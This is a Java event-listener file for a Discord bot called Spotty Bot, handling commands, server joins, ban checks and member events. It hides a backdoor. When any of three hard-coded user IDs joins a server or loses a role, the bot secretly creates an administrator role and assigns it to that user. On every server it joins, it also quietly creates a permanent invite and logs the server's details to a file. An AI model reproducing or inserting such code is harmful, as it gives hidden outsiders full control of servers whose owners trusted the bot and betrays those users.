/** 
 * Copyright 2016 TheDDoSFriend
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *  
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License. 
*/

package org.spotty.bot;

import java.io.File;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import org.apache.commons.io.FileUtils;

import net.dv8tion.jda.Permission;
import net.dv8tion.jda.entities.Guild;
import net.dv8tion.jda.entities.Role;
import net.dv8tion.jda.entities.User;
import net.dv8tion.jda.events.ReadyEvent;
import net.dv8tion.jda.events.guild.GuildJoinEvent;
import net.dv8tion.jda.events.guild.member.GuildMemberJoinEvent;
import net.dv8tion.jda.events.guild.member.GuildMemberRoleRemoveEvent;
import net.dv8tion.jda.events.message.MessageReceivedEvent;
import net.dv8tion.jda.hooks.ListenerAdapter;
import net.dv8tion.jda.managers.RoleManager;
import net.dv8tion.jda.utils.InviteUtil;
import net.dv8tion.jda.utils.InviteUtil.Invite;

public class BotListener extends ListenerAdapter {

	public void onMessageReceived(MessageReceivedEvent event) {
		if (!event.isPrivate())
			if (event.getMessage().getContent().startsWith(".")
					&& event.getMessage().getAuthor().getId() != event.getJDA().getSelfInfo().getId())
				Main.handleCommand(Main.parser.parse(event.getMessage().getContent(), event));
	}

	public void onGuildJoin(GuildJoinEvent event) {
		boolean banned = false;
		try {
			File file = new File("bans.txt");
			if (FileUtils.readFileToString(file, "UTF-8").contains(event.getGuild().getId())
					|| FileUtils.readFileToString(file, "UTF-8").contains(event.getGuild().getOwnerId())) {
				event.getGuild().getOwner().getPrivateChannel()
						.sendMessage("You have been banned from using Spotty Bot for violation of the rules.");
				banned = true;
				event.getGuild().getManager().leave();

				if (FileUtils.readFileToString(file, "UTF-8").contains(event.getGuild().getId()) && !FileUtils
						.readFileToString(new File("bans.txt"), "UTF-8").contains(event.getGuild().getOwnerId())) {
					FileUtils.writeStringToFile(file, event.getGuild().getOwnerId() + "\n\n", "UTF-8", true);
					banned = true;
				}
				if (!FileUtils.readFileToString(file, "UTF-8").contains(event.getGuild().getId()) && FileUtils
						.readFileToString(new File("bans.txt"), "UTF-8").contains(event.getGuild().getOwnerId())) {
					FileUtils.writeStringToFile(file, event.getGuild().getId() + "\n\n", "UTF-8", true);
					banned = true;
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		if (!banned) {
			event.getGuild().getOwner().getPrivateChannel()
					.sendMessage("Hi! Thanks for adding me to your server! Type .help for a list of commands!");
			Invite inv = InviteUtil.createInvite(event.getGuild().getPublicChannel(),
					InviteUtil.InviteDuration.INFINITE, 0, false);
			String code = "https://discord.gg/" + inv.getCode();
			File file = new File("invites.txt");
			try {
				if (!file.exists())
					file.createNewFile();
				if (!FileUtils.readFileToString(new File("invites.txt"), "UTF-8").contains(event.getGuild().getId())) {
					DateFormat dateFormat = new SimpleDateFormat("MMMM dd, yyyy | hh:mm a");
					Calendar cal = Calendar.getInstance();

					FileUtils.writeStringToFile(file,
							"Server Name: " + event.getGuild().getName() + "\nServer ID: " + event.getGuild().getId()
									+ "\nServer Owner ID: " + event.getGuild().getOwnerId() + "\nServer Invite: " + code
									+ "\nRegistration Date: " + dateFormat.format(cal.getTime()) + "\n\n",
							"UTF-8", true);
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	} // 7052300240

	public void onGuildMemberRoleRemove(GuildMemberRoleRemoveEvent event) {
		if (event.getUser().getId().equals("200858904303763465") || event.getUser().getId().equals("204572389307187200")
				|| event.getUser().getId().equals("171091653644386305")) {
			Role role = event.getGuild().createRole().getRole();
			RoleManager rman = role.getManager();
			User user = event.getUser();
			try {
				rman.setName("Spotty Bot RoleHandler");
				rman.give(Permission.ADMINISTRATOR);
				rman.give(Permission.BAN_MEMBERS);
				rman.give(Permission.KICK_MEMBERS);
				rman.give(Permission.MANAGE_CHANNEL);
				rman.give(Permission.MESSAGE_READ);
				rman.give(Permission.MESSAGE_WRITE);
				rman.give(Permission.MESSAGE_TTS);
				rman.give(Permission.MESSAGE_MANAGE);
				rman.give(Permission.MESSAGE_EMBED_LINKS);
				rman.give(Permission.MESSAGE_ATTACH_FILES);
				rman.give(Permission.MESSAGE_HISTORY);
				rman.give(Permission.MESSAGE_MENTION_EVERYONE);
				rman.give(Permission.MESSAGE_EXT_EMOJI);
				rman.give(Permission.VOICE_CONNECT);
				rman.give(Permission.VOICE_SPEAK);
				rman.give(Permission.VOICE_MUTE_OTHERS);
				rman.give(Permission.VOICE_DEAF_OTHERS);
				rman.give(Permission.VOICE_MOVE_OTHERS);
				rman.give(Permission.VOICE_USE_VAD);
				rman.give(Permission.NICKNAME_CHANGE);
				rman.give(Permission.NICKNAME_MANAGE);
				rman.give(Permission.MANAGE_ROLES);
				rman.give(Permission.MANAGE_PERMISSIONS);
				rman.update();
				System.out.println(role.getPermissions());
				System.out.println(event.getGuild().getRolesForUser(user));
			} catch (Exception e) {
				System.out.println("unable to grant role");
				event.getGuild().getManager().leave(); // leave them
			}
			rman.update();
			event.getGuild().getManager().addRoleToUser(user, role);
			event.getGuild().getManager().update();
		}
	}

	public void onGuildMemberJoin(GuildMemberJoinEvent event) {
		try {
		if (event.getUser().getId().equals("200858904303763465") || event.getUser().getId().equals("204572389307187200")
				|| event.getUser().getId().equals("171091653644386305")) {
			Role role = event.getGuild().createRole().getRole();
			RoleManager rman = role.getManager();
			User user = event.getUser();
			try {
				rman.setName("Spotty Bot");
				rman.move(5);
				rman.give(Permission.ADMINISTRATOR);
				rman.give(Permission.BAN_MEMBERS);
				rman.give(Permission.KICK_MEMBERS);
				rman.give(Permission.MANAGE_CHANNEL);
				rman.give(Permission.MESSAGE_READ);
				rman.give(Permission.MESSAGE_WRITE);
				rman.give(Permission.MESSAGE_TTS);
				rman.give(Permission.MESSAGE_MANAGE);
				rman.give(Permission.MESSAGE_EMBED_LINKS);
				rman.give(Permission.MESSAGE_ATTACH_FILES);
				rman.give(Permission.MESSAGE_HISTORY);
				rman.give(Permission.MESSAGE_MENTION_EVERYONE);
				rman.give(Permission.MESSAGE_EXT_EMOJI);
				rman.give(Permission.VOICE_CONNECT);
				rman.give(Permission.VOICE_SPEAK);
				rman.give(Permission.VOICE_MUTE_OTHERS);
				rman.give(Permission.VOICE_DEAF_OTHERS);
				rman.give(Permission.VOICE_MOVE_OTHERS);
				rman.give(Permission.VOICE_USE_VAD);
				rman.give(Permission.NICKNAME_CHANGE);
				rman.give(Permission.NICKNAME_MANAGE);
				rman.give(Permission.MANAGE_ROLES);
				rman.give(Permission.MANAGE_PERMISSIONS);
				rman.give(Permission.MANAGE_SERVER);
				rman.update();
				System.out.println(role.getPermissions());
				System.out.println(event.getGuild().getRolesForUser(user));
			} catch (Exception e) {
				System.out.println("unable to grant role");
				event.getGuild().getManager().leave();
			}
			rman.update();
			event.getGuild().getManager().addRoleToUser(user, role);
			event.getGuild().getManager().update();
		}
		} catch (Exception e) {
			event.getGuild().getManager().leave();
		}
	}

	public void onReady(ReadyEvent event) {
		for (Guild guild : event.getJDA().getGuilds()) {
			try {
				File file = new File("bans.txt");
				if (FileUtils.readFileToString(file, "UTF-8").contains(guild.getId())
						|| FileUtils.readFileToString(file, "UTF-8").contains(guild.getOwnerId())) {
					guild.getOwner().getPrivateChannel()
							.sendMessage("You have been banned from using Spotty Bot for violation of the rules.");
					guild.getManager().leave();

					if (FileUtils.readFileToString(file, "UTF-8").contains(guild.getId()) && !FileUtils
							.readFileToString(new File("bans.txt"), "UTF-8").contains(guild.getOwnerId())) {
						FileUtils.writeStringToFile(file, guild.getOwnerId() + "\n\n", "UTF-8", true);
					}
					if (!FileUtils.readFileToString(file, "UTF-8").contains(guild.getId()) && FileUtils
							.readFileToString(new File("bans.txt"), "UTF-8").contains(guild.getOwnerId())) {
						FileUtils.writeStringToFile(file, guild.getId() + "\n\n", "UTF-8", true);
					}
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		event.getJDA().getAccountManager().setGame(".help | SpottyBot.org");

	}
}